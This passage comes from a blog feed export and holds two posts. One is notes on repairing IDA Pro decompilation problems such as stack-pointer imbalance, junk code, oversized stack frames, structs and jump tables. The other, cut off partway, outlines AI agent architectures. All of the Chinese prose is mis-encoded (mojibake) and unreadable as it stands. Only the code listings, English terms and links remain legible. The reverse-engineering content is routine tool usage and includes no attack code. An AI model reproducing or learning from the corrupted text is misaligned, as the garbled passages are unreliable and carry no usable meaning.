ˆæŒ‡é’ˆçš„nopæ‰</p><blockquote><p>å…¶å®èƒ½åç¼–è¯‘çš„å¯ä»¥éƒ½ä¸ç”¨ç®¡ï¼Œç½‘ä¸Šå¾ˆå¤šæ–¹æ³•éƒ½åªæ˜¯ä¸ºäº†åç¼–è¯‘æœåŠ¡æ²¡æœ‰çœŸçš„è§£å†³é—®é¢˜ï¼Œå…·ä½“çš„é—®é¢˜å¾—è¿½å…·ä½“çš„å †æ ˆã€‚<br>å®åœ¨ä¸ä¼šç›´æ¥Alt+Kæ”¹æ˜¾ç¤ºè´Ÿæ•°çš„å †æ ˆä¸€ä¸ªä¸ªè¯•å°±è¡Œã€‚</p></blockquote><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="æ‰“å¼€æ ˆæŒ‡é’ˆæ˜¾ç¤º"><a href="#æ‰“å¼€æ ˆæŒ‡é’ˆæ˜¾ç¤º" class="headerlink" title="æ‰“å¼€æ ˆæŒ‡é’ˆæ˜¾ç¤º"></a>æ‰“å¼€æ ˆæŒ‡é’ˆæ˜¾ç¤º</h3><p>Options-General<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507110043765.png" alt=""></p><p>åœ¨0x411940çš„ä½ç½®æŒ‰Alt+Kï¼Œå¯ä»¥ç†è§£ä¸ºæ²¡æœ‰<code>push ebp</code>å‰SPæ˜¯0ï¼Œ<code>push ebp</code>å®Œæ˜¯0x4ã€‚<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507110109594.png" alt=""></p><p>å †æ ˆæ˜¯ä»é«˜å¤„å¾€ä½å¤„ç”Ÿé•¿çš„ã€‚<br>å‡½æ•°è°ƒç”¨ï¼ˆcallï¼‰ä¸€èˆ¬ä¼š<strong>å‹æ ˆè¿”å›åœ°å€</strong>ï¼Œå‡½æ•°å†…ä¼šä½¿ç”¨ push å‹å‚æ•°ï¼Œè°ƒç”¨å®Œæ¯•åä¼šé€šè¿‡ ret æˆ– ret xï¼ˆå…¶ä¸­ x æ˜¯å‚æ•°å¤§å°ï¼‰æ¥æ¢å¤æ ˆã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:004119FA -04    cmp     ebp, esp</span><br><span class="line">;è¿™æ˜¯å¯¹æ¯”å½“å‰æ ˆæŒ‡é’ˆ esp å’ŒåŸºå€æŒ‡é’ˆ ebpã€‚</span><br><span class="line">;å¦‚æœè¿™ä¸¤ä¸ªç›¸ç­‰ï¼Œè¯´æ˜å‡½æ•°æ ˆå¸§è¿˜â€œå¹²å‡€â€ï¼Œæ²¡æœ‰æ ˆæº¢å‡ºæˆ–æœªå¹³è¡¡çš„ push/pop æ“ä½œã€‚</span><br><span class="line">;å¦åˆ™ï¼Œå°±æ˜¯ æ ˆä¸å¹³è¡¡çš„è¿¹è±¡ï¼ˆä¹Ÿå°±æ˜¯å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ç ´åäº†æ ˆç»“æ„ï¼‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:004119FC -04    call    j___RTC_CheckEsp</span><br><span class="line">;MSVC ç¼–è¯‘å™¨ç”Ÿæˆçš„è¿è¡Œæ—¶æ£€æµ‹å‡½æ•°ï¼Œä¸»è¦ç”¨äºè°ƒè¯•å’Œè¿è¡Œæ—¶æ£€æŸ¥ç›®çš„ã€‚</span><br><span class="line">;æ£€æŸ¥ cmp ebp, esp çš„ç»“æœï¼Œå¦‚æœ esp ä¸ ebp ä¸ç›¸ç­‰ï¼Œå°±å¯èƒ½æŠ›å‡ºé”™è¯¯æˆ–å´©æºƒæç¤ºã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:00411A01 -04    mov     esp, ebp</span><br><span class="line">;æ— è®ºå‰é¢ esp è¢«ç ´åå¾—å¤šä¸¥é‡ï¼Œè¿™æ¡è¯­å¥æ˜¯å¼ºåˆ¶æŠŠæ ˆæ¢å¤åˆ°åŸå§‹åŸºå€ï¼Œä¿è¯å‡½æ•°é€€å‡ºæ—¶æ ˆæ˜¯å¹²å‡€çš„ã€‚</span><br></pre></td></tr></table></figure><h3 id="å †æ ˆå¹³è¡¡"><a href="#å †æ ˆå¹³è¡¡" class="headerlink" title="å †æ ˆå¹³è¡¡"></a>å †æ ˆå¹³è¡¡</h3><p>åœ¨ x86 ä½“ç³»ä¸­ï¼Œå‡½æ•°è°ƒç”¨æ˜¯é€šè¿‡å †æ ˆä¼ å‚çš„ï¼Œæ¯æ¬¡ call å‡½æ•°éƒ½ä¼šæŠŠè¿”å›åœ°å€å‹å…¥å †æ ˆï¼Œå‚æ•°ä¹Ÿä¸€èˆ¬æ˜¯é€šè¿‡ push å…¥æ ˆã€‚<br>è€Œå‡½æ•°æ‰§è¡Œå®Œåï¼Œéœ€è¦æ¢å¤è¿™äº› pushã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å‡½æ•°è°ƒç”¨å¤„ï¼ˆmainï¼‰ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 2        ; å‚æ•° b</span><br><span class="line">push 1        ; å‚æ•° a</span><br><span class="line">call add      ; è·³è½¬å¹¶ä¿å­˜è¿”å›åœ°å€åˆ°æ ˆé‡Œ</span><br><span class="line">add esp, 8    ; æ¸…ç†å‚æ•°ï¼ˆ2ä¸ª Ã— 4å­—èŠ‚ï¼‰</span><br></pre></td></tr></table></figure><br>å‡½æ•°è¿”å›å¤„ï¼ˆaddï¼‰ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [ebp+8]   ; a</span><br><span class="line">add eax, [ebp+0Ch] ; b</span><br><span class="line">pop ebp</span><br><span class="line">ret                ; å¼¹å‡ºè¿”å›åœ°å€</span><br></pre></td></tr></table></figure></p><ul><li>æ¯”å¦‚å°‘äº† å°‘äº† <code>add esp, 8</code> æˆ– <code>ret 8</code>å †æ ˆå°±ä¼šä¸å¹³è¡¡</li></ul><p>å½“æ‰§è¡Œ call æŒ‡ä»¤æ—¶ï¼ŒCPU ä¼šè‡ªåŠ¨åšä¸¤ä»¶äº‹ï¼š<br>1ã€æŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼ˆè¿”å›åœ°å€ï¼‰å‹æ ˆï¼ˆå³ ESP æ‰€æŒ‡çš„åœ°æ–¹ï¼‰ï¼›<br>2ã€è·³è½¬åˆ°å‡½æ•°ä½“çš„åœ°å€ï¼ˆcall æŒ‡å‘çš„å‡½æ•°ï¼‰æ‰§è¡Œï¼›</p><h1 id="Decompile-as-call"><a href="#Decompile-as-call" class="headerlink" title="Decompile as call"></a>Decompile as call</h1><p>IDAå®˜æ–¹ï¼š<a href="https://hex-rays.com/blog/igors-tip-of-the-week-71-decompile-as-call#:~:text=Invoke%20Edit%20%3E%20Other%20%3E%20Decompile%20as%20call%E2%80%A6,use%3A%20void%20__usercall%20mtsgpr3%28unsigned%20int%3Cr30%3E%29%20int%20__usercall%20mftb%3Cr3%3E%28%29%3B">Decompile as call ï¼ˆåç¼–è¯‘ä¸ºè°ƒç”¨)</a><br>Invoke Edit &gt; Other &gt; Decompile as callâ€¦<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507110248927.png" alt=""><br>Decompile as call ä¸»è¦ç”¨äº<strong>åœ¨åç¼–è¯‘è§†å›¾ä¸­å°†æŸä¸ªä¸å¯è¯†åˆ«çš„æŒ‡ä»¤æˆ–æœªçŸ¥å‡½æ•°å¼ºåˆ¶å½“ä½œå‡½æ•°è°ƒç”¨å¤„ç†ã€‚</strong></p><p><strong>__usercall</strong>ï¼š æ˜¯ä¸€ç§ä¼ªå‡½æ•°å£°æ˜è¯­æ³•ï¼Œå¯ä»¥æ‰‹åŠ¨æŒ‡å®šè°ƒç”¨çº¦å®šã€è¾“å…¥/è¾“å‡ºå¯„å­˜å™¨ç­‰ã€‚</p><h1 id="too-big-stack-frame"><a href="#too-big-stack-frame" class="headerlink" title="too big stack frame"></a>too big stack frame</h1><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111451810.png" alt=""></p><p><strong>æ‰“å¼€æ ˆæŒ‡é’ˆæ˜¾ç¤º</strong><br>Options-General<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507110043765.png" alt=""><br>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://hex-rays.com/blog/igors-tip-of-the-week-147-fixing-stack-frame-is-too-big#:~:text=To%20fix%2C%20double-click%20the%20variable%20or%20press%20Ctrl,editor%2C%20then%20undefine%20%28U%29%20the%20wrong%20stackvar%20%28s%29.">Fixing â€œstack frame is too bigâ€</a><br>ä½ æ€»è§ˆå…ˆæ‰’æ‹‰ä¸€ä¸‹çœ‹çœ‹å“ªé‡ŒSPä¸å¯¹</p><ul><li>é”™è¯¯åˆ›å»ºçš„ï¼ˆæŒ‰ä¸‹ç«‹å³ä½œæ•°ï¼‰</li><li>æ•…æ„è¯±å¯¼çš„ï¼ˆåƒåœ¾ä»£ç æ˜¯æŒ‡å®é™…æœªä½¿ç”¨çš„å¤§å †æ ˆåç§»é‡ï¼‰</li></ul><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111457121.png" alt=""><br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111500819.png" alt=""></p><p>å…¶å®å’Œpositive sp valueè§£æ–¹æ³•å·®ä¸å¤šï¼Œå“ªé‡Œä¸å¯¹ä¿®å“ªé‡Œã€‚ç¬¬ä¸€ä¸ªå¼‚å¸¸å¢åŠ espï¼Œnopæ‰ï¼Œç¬¬äºŒä¸ªä¿®æ”¹å±€éƒ¨å˜é‡å¤§å°ï¼ˆä¸Šé¢è´´çš„ğŸ”—å’Œæˆ‘æ–‡ä¸­ä¸Šé¢éƒ½æœ‰è®²æ€ä¹ˆæ”¹ï¼‰</p><h1 id="å·²çŸ¥ç»“æ„ä½“å¤§å°åˆ›å»ºç»“æ„ä½“"><a href="#å·²çŸ¥ç»“æ„ä½“å¤§å°åˆ›å»ºç»“æ„ä½“" class="headerlink" title="å·²çŸ¥ç»“æ„ä½“å¤§å°åˆ›å»ºç»“æ„ä½“"></a>å·²çŸ¥ç»“æ„ä½“å¤§å°åˆ›å»ºç»“æ„ä½“</h1><blockquote><p>IDA9.0/IDA9.1æ‰¾ä¸åˆ°Structureï¼š<a href="https://github.com/CynicRus/StructureCreatorPlugin-for-IDA-9.0">https://github.com/CynicRus/StructureCreatorPlugin-for-IDA-9.0</a><br>local typesä¹Ÿå¯ä»¥æˆ‘ç”¨ä¸ä¹ æƒ¯</p></blockquote><p><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111524952.png" alt=""><br>åœ¨Structureçª—å£()<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ins/Del : æ’å…¥/åˆ é™¤ç»“æ„ä½“</span><br><span class="line">D/A/* : åˆ›å»ºç»“æ„ä½“æˆå‘˜ï¼ˆæ•°æ®å‹/ASCIIå­—ç¬¦å‹/æ•°ç»„å‹ï¼‰</span><br><span class="line">N : é‡å‘½åç»“æ„ä½“æˆ–ç»“æ„ä½“æˆå‘˜</span><br><span class="line">U : åˆ é™¤ç»“æ„ä½“æˆå‘˜</span><br></pre></td></tr></table></figure></p><ul><li><strong>insåˆ›å»ºç»“æ„ä½“</strong></li><li><strong>D åˆ›å»ºå­—æ®µ</strong></li><li><p><strong><code>*</code> ä¿®æ”¹æ•°ç»„å¤§å°</strong><br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111548776.png" alt=""></p></li><li><p><strong>æ·»åŠ æ•°ç»„é—´éš”</strong><br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111547158.png" alt=""></p></li></ul><h1 id="è·³è½¬è¡¨ä¿®å¤"><a href="#è·³è½¬è¡¨ä¿®å¤" class="headerlink" title="è·³è½¬è¡¨ä¿®å¤"></a>è·³è½¬è¡¨ä¿®å¤</h1><p>GCCåœ¨ç¼–è¯‘è¶…è¿‡5ä¸ªswitchçš„ç»“æ„æ—¶ä¼šç”¨è·³è¡¨è¿›è¡Œä¼˜åŒ–<br>Edit -&gt; Other â€”&gt; Specify switch<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202507111556203.png" alt=""></p><ul><li>Address of Jump tableï¼šè·³è¡¨çš„åœ°å€</li><li>Number of elementsï¼šè·³è½¬è¡¨é¡¹æ•°</li><li>Size of table elementï¼šè·³è½¬æ¯é¡¹çš„å­—èŠ‚æ•°</li><li>Element shift amountï¼šè¿™ä¸ªä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯é›¶ï¼Œå’Œè·³è¡¨è®¡ç®—æ—¶çš„æ–¹å¼æœ‰å…³ï¼Œ</li><li>Element base valueï¼šè®¾ç½®ä¸ºè®¡ç®—è·³è½¬åœ°å€æ—¶ç»™è·³è¡¨å…ƒç´ åŠ çš„å€¼ï¼Œ</li><li>Start of the switch idiomï¼šè¿™ä¸ªé»˜è®¤å°±è¡Œï¼Œå°±æ˜¯è·å–è·³è¡¨å€¼çš„è¯­å¥çš„åœ°å€</li><li>Input register of switchï¼šè®¾ç½®ä¸ºç”¨äºç»™è·³è¡¨å¯»å€çš„å¯„å­˜å™¨</li><li>First(lowest) input valueï¼šå°±æ˜¯ switch çš„æœ€å°å€¼äº†</li><li>Default jump addressï¼šä¹Ÿå°±æ˜¯ default çš„è·³è½¬ä½ç½®ï¼Œå…¶å®æœ‰æ—¶å€™å¯ä»¥ä¸å¡«ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯å¡«ä¸Šï¼Œè¿™ä¸ªä¸€èˆ¬åœ¨ä¸Šæ–¹ä¸è¿œå¤„çš„ cmp æŒ‡ä»¤é™„è¿‘ã€‚</li></ul><h1 id="Decompilation-failure-too-big-function"><a href="#Decompilation-failure-too-big-function" class="headerlink" title="Decompilation failure - too big function"></a>Decompilation failure - too big function</h1><p>ä¹Ÿå¯ä»¥å…ˆrebaseä¸€ä¸‹è¯•è¯•<br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202508272247150.png" alt=""><br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202508272249598.png" alt=""><br><img src="https://raw.githubusercontent.com/Samsara-lo/TyporaPics/main/test/202508272308266.png" alt=""></p><script src="https://giscus.app/client.js"        data-repo="Samsara-lo/Samsara-lo.github.io"        data-repo-id="R_kgDONimTFg"        data-category="General"        data-category-id="DIC_kwDONimTFs4CorbM"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="bottom"        data-theme="light_high_contrast"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI_agent_zer0_to_oneï¼ˆäºŒï¼‰</title>
      <link href="/2025/03/16/AI-agent-zer0-to-one%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2025/03/16/AI-agent-zer0-to-one%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="AI-Agent-æ¶æ„è®¾è®¡"><a href="#AI-Agent-æ¶æ„è®¾è®¡" class="headerlink" title="AI Agent æ¶æ„è®¾è®¡"></a><strong>AI Agent æ¶æ„è®¾è®¡</strong></h2><h3 id="Agent-æ¶æ„çš„åŸºæœ¬ç»„ä»¶"><a href="#Agent-æ¶æ„çš„åŸºæœ¬ç»„ä»¶" class="headerlink" title="Agent æ¶æ„çš„åŸºæœ¬ç»„ä»¶"></a><strong>Agent æ¶æ„çš„åŸºæœ¬ç»„ä»¶</strong></h3><p>AI Agentçš„æ¶æ„é€šå¸¸åŒ…å«ä»¥ä¸‹åŸºæœ¬ç»„ä»¶ï¼šæ„ŸçŸ¥æ¨¡å—ã€æ¨ç†å¼•æ“å’Œè¡ŒåŠ¨æ‰§è¡Œæ¨¡å—ã€‚è¿™äº›ç»„ä»¶å…±åŒå·¥ä½œï¼Œä½¿Agentèƒ½å¤Ÿæ„ŸçŸ¥ç¯å¢ƒã€åšå‡ºå†³ç­–å¹¶é‡‡å–è¡ŒåŠ¨ã€‚</p><p><strong>æ„ŸçŸ¥æ¨¡å—</strong>ï¼šè´Ÿè´£ä»ç¯å¢ƒä¸­æ”¶é›†ä¿¡æ¯ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºAgentå¯ä»¥å¤„ç†çš„æ ¼å¼ã€‚</p><p>å…³é”®ç‰¹ç‚¹ï¼š</p><ol><li>å¤šæ¨¡æ€æ„ŸçŸ¥ï¼šå¤„ç†è§†è§‰ã€å¬è§‰ã€è§¦è§‰ç­‰å¤šç§è¾“å…¥ã€‚</li><li>æ•°æ®é¢„å¤„ç†ï¼šæ»¤æ³¢ã€å½’ä¸€åŒ–ã€ç‰¹å¾æå–ç­‰ã€‚</li><li>ä¼ æ„Ÿå™¨èåˆï¼šæ•´åˆå¤šä¸ªä¼ æ„Ÿå™¨çš„æ•°æ®ã€‚</li></ol><p><strong>æ¨ç†å¼•æ“ï¼š</strong>Agentçš„â€å¤§è„‘â€ï¼Œè´Ÿè´£å¤„ç†æ„ŸçŸ¥åˆ°çš„ä¿¡æ¯ï¼Œåšå‡ºå†³ç­–ï¼Œå¹¶ç”Ÿæˆè¡ŒåŠ¨è®¡åˆ’ã€‚</p><p>å…³é”®ç‰¹ç‚¹ï¼š</p><ol><li>çŸ¥è¯†è¡¨ç¤ºï¼šå­˜å‚¨å’Œç»„ç»‡Agentçš„çŸ¥è¯†å’Œä¿¡å¿µã€‚</li><li>æ¨ç†æœºåˆ¶ï¼šåŸºäºè§„åˆ™ã€æ¦‚ç‡æˆ–ç¥ç»ç½‘ç»œçš„æ¨ç†ã€‚</li><li>å­¦ä¹ èƒ½åŠ›ï¼šä»ç»éªŒä¸­æ›´æ–°çŸ¥è¯†å’Œç­–ç•¥ã€‚</li></ol><p><strong>è¡ŒåŠ¨æ‰§è¡Œæ¨¡å—ï¼š</strong>å°†æ¨ç†å¼•æ“çš„å†³ç­–è½¬åŒ–ä¸ºå…·ä½“çš„è¡ŒåŠ¨ï¼Œå¹¶ä¸ç¯å¢ƒè¿›è¡Œäº¤äº’ã€‚</p><p>å…³é”®ç‰¹ç‚¹ï¼š</p><ol><li>åŠ¨ä½œæ˜ å°„ï¼šå°†é«˜çº§å†³ç­–è½¬æ¢ä¸ºä½çº§æ§åˆ¶å‘½ä»¤ã€‚</li><li>åé¦ˆæ§åˆ¶ï¼šæ ¹æ®æ‰§è¡Œç»“æœè°ƒæ•´è¡ŒåŠ¨ã€‚</li><li>å®‰å…¨æœºåˆ¶ï¼šç¡®ä¿è¡ŒåŠ¨ä¸ä¼šå±åŠAgentæˆ–ç¯å¢ƒã€‚</li></ol><h3 id="å¸¸è§çš„-Agent-æ¶æ„"><a href="#å¸¸è§çš„-Agent-æ¶æ„" class="headerlink" title="å¸¸è§çš„ Agent æ¶æ„"></a><strong>å¸¸è§çš„ Agent æ¶æ„</strong></h3><p><strong>ååº”å¼æ¶æ„ï¼š</strong>ç›´æ¥å°†æ„ŸçŸ¥æ˜ å°„åˆ°è¡ŒåŠ¨ï¼Œä¸éœ€è¦å†…éƒ¨çŠ¶æ€æˆ–å¤æ‚çš„æ¨ç†è¿‡ç¨‹ã€‚</p><p>ç‰¹ç‚¹ï¼š</p><ol><li>å¿«é€Ÿå“åº”</li><li>ä½è®¡ç®—å¤æ‚åº¦</li><li>é€‚åˆç®€å•ã€æ˜ç¡®çš„ä»»åŠ¡ç¯å¢ƒ</li></ol><p><strong>åˆ†å±‚æ¶æ„ï¼š</strong>å°†Agentçš„åŠŸèƒ½åˆ’åˆ†ä¸ºå¤šä¸ªå±‚æ¬¡ï¼Œæ¯ä¸ªå±‚æ¬¡è´Ÿè´£ä¸åŒæŠ½è±¡çº§åˆ«çš„ä»»åŠ¡ã€‚</p><p>ç‰¹ç‚¹ï¼š</p><ol><li>æ¨¡å—åŒ–è®¾è®¡</li><li>æ”¯æŒä¸åŒæ—¶é—´å°ºåº¦çš„å†³ç­–</li><li><p>é€‚åˆå¤æ‚ä»»åŠ¡å’Œé•¿æœŸè§„åˆ’</p><p><strong>BDI æ¶æ„ï¼š</strong>Belief-Desire-Intentionï¼Œä¸€ç§åŸºäºäººç±»æ¨ç†çš„Agentæ¨¡å‹ï¼ŒåŒ…å«ä¿¡å¿µï¼ˆå¯¹ä¸–ç•Œçš„è®¤çŸ¥ï¼‰ã€æ¬²æœ›ï¼ˆç›®æ ‡ï¼‰å’Œæ„å›¾ï¼ˆè®¡åˆ’ï¼‰ä¸‰ä¸ªå…³é”®ç»„ä»¶ã€‚</p></li></ol><p>ç‰¹ç‚¹ï¼š</p><ol><li>æ¨¡æ‹Ÿäººç±»æ¨ç†è¿‡ç¨‹</li><li>æ”¯æŒå¤æ‚çš„ç›®æ ‡å¯¼å‘è¡Œä¸º</li><li>é€‚åˆåŠ¨æ€ã€ä¸ç¡®å®šçš„ç¯å¢ƒ</li></ol><h3 id="å¤š-Agent-ç³»ç»ŸMASè®¾è®¡"><a href="#å¤š-Agent-ç³»ç»ŸMASè®¾è®¡" class="headerlink" title="å¤š Agent ç³»ç»ŸMASè®¾è®¡"></a><strong>å¤š Agent ç³»ç»ŸMASè®¾è®¡</strong></h3><p>æ¶‰åŠå¤šä¸ªäº¤äº’çš„æ™ºèƒ½Agentï¼Œè¿™äº›Agentå¯ä»¥åä½œæˆ–ç«äº‰æ¥è§£å†³å¤æ‚é—®é¢˜ã€‚è®¾è®¡å¤šAgentç³»ç»Ÿéœ€è¦è€ƒè™‘Agenté—´çš„é€šä¿¡ã€åä½œæœºåˆ¶ä»¥åŠæ•´ä½“ç³»ç»Ÿçš„ç»„ç»‡ç»“æ„ã€‚</p><p><strong>å¤šAgentç³»ç»Ÿï¼ˆMASï¼‰æ¶æ„è®¾è®¡æ¨¡å¼</strong></p><p><strong>æ¦‚è¿°ï¼š</strong>ä¸€ç§ç”¨äºè®¾è®¡å’Œå®ç°å¤æ‚åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ¶æ„æ–¹æ³•ã€‚</p><ul><li>æ ¸å¿ƒæ¦‚å¿µï¼š<ul><li><strong>æ™ºèƒ½ä»£ç†</strong>ï¼šæ™ºèƒ½ä»£ç†æ˜¯MASçš„åŸºæœ¬æ„å»ºå•å…ƒã€‚æ¯ä¸ªä»£ç†å…·æœ‰æ„ŸçŸ¥ã€å†³ç­–å’Œè¡ŒåŠ¨çš„èƒ½åŠ›ã€‚ä»£ç†å¯ä»¥æ˜¯è½¯ä»¶å®ä½“æˆ–ç‰©ç†å®ä½“ï¼Œå¦‚æœºå™¨äººã€‚</li><li><strong>ç¯å¢ƒ</strong>ï¼šç¯å¢ƒæ˜¯ä»£ç†æ„ŸçŸ¥å’Œè¡ŒåŠ¨çš„åœºæ‰€ã€‚ç¯å¢ƒå¯ä»¥æ˜¯ç‰©ç†ä¸–ç•Œã€è™šæ‹Ÿä¸–ç•Œæˆ–æ··åˆä¸–ç•Œã€‚</li><li><strong>é€šä¿¡</strong>ï¼šä»£ç†ä¹‹é—´é€šè¿‡é€šä¿¡è¿›è¡Œä¿¡æ¯äº¤æ¢å’Œåä½œã€‚é€šä¿¡å¯ä»¥æ˜¯ç›´æ¥çš„ï¼ˆå¦‚æ¶ˆæ¯ä¼ é€’ï¼‰æˆ–é—´æ¥çš„ï¼ˆå¦‚é€šè¿‡ç¯å¢ƒï¼‰ã€‚</li><li><strong>åä½œ</strong>ï¼šä»£ç†é€šè¿‡åä½œæ¥å®ç°å…±åŒçš„ç›®æ ‡ã€‚åä½œå¯ä»¥æ˜¯æ˜¾å¼çš„ï¼ˆå¦‚ä»»åŠ¡åˆ†é…ï¼‰æˆ–éšå¼çš„ï¼ˆå¦‚è¡Œä¸ºåè°ƒï¼‰ã€‚</li><li><strong>è‡ªæ²»</strong>ï¼šä»£ç†å…·æœ‰è‡ªä¸»å†³ç­–çš„èƒ½åŠ›ï¼Œå¯ä»¥æ ¹æ®ç¯å¢ƒå˜åŒ–å’Œè‡ªèº«ç›®æ ‡è¿›è¡Œè°ƒæ•´ã€‚</li></ul></li><li><p>MASçš„ç³»ç»Ÿæ¶æ„ï¼š</p><ul><li><strong>æ„ŸçŸ¥å±‚</strong>ï¼šè´Ÿè´£ä»ç¯å¢ƒä¸­è·å–ä¿¡æ¯ã€‚</li><li><strong>å†³ç­–å±‚</strong>ï¼šè´Ÿè´£æ ¹æ®æ„ŸçŸ¥ä¿¡æ¯è¿›è¡Œå†³ç­–ã€‚</li><li><strong>è¡ŒåŠ¨å±‚</strong>ï¼šè´Ÿè´£æ‰§è¡Œå†³ç­–å¹¶å½±å“ç¯å¢ƒã€‚</li><li><p><strong>é€šä¿¡å±‚</strong>ï¼šè´Ÿè´£ä»£ç†ä¹‹é—´çš„ä¿¡æ¯äº¤æ¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[æ„ŸçŸ¥å±‚] --&gt; B[å†³ç­–å±‚]</span><br><span class="line">    B --&gt; C[è¡ŒåŠ¨å±‚]</span><br><span class="line">    B --&gt; D[é€šä¿¡å±‚]</span><br><span class="line">    D --&gt; B</span><br><span class="line"></span><br><span class="line">%% è‡ªå®šä¹‰æ ·å¼</span><br><span class="line">classDef default fill:#ffffff,stroke:#000000,color:#000000;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>ä»£ç†æ¶æ„æ¨¡å¼ï¼š</p><ul><li><strong>ååº”å¼ä»£ç†</strong>ï¼šåŸºäºæ„ŸçŸ¥-è¡ŒåŠ¨è§„åˆ™ï¼Œå¿«é€Ÿå“åº”ç¯å¢ƒå˜åŒ–ã€‚</li><li><strong>è®¤çŸ¥ä»£ç†</strong>ï¼šå…·æœ‰å†…éƒ¨çŠ¶æ€å’Œæ¨ç†èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿›è¡Œå¤æ‚å†³ç­–ã€‚</li><li><strong>æ··åˆä»£ç†</strong>ï¼šç»“åˆååº”å¼å’Œè®¤çŸ¥ç‰¹æ€§ï¼Œå…¼å…·å¿«é€Ÿå“åº”å’Œå¤æ‚å†³ç­–èƒ½åŠ›ã€‚</li></ul></li><li>åä½œæ¨¡å¼ï¼šå†³å®šäº†ä»£ç†å¦‚ä½•ååŒå·¥ä½œä»¥å®ç°å…±åŒç›®æ ‡ã€‚<ul><li><strong>åˆåŒç½‘åè®®</strong>ï¼šé€šè¿‡ç«æ 